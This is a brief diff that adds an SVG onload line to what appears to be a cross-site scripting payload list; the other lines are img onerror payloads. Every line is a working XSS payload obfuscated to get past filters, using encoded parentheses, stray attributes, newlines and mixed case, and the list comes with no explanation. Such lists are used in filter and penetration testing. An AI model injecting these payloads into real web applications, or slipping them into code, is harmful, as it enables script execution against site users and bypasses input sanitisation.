@@ -1,3 +1,4 @@
+<svg onload=prompt%26%230000000040document.domain)>
 <img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>
 <img src=x on onerror=alert()>
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
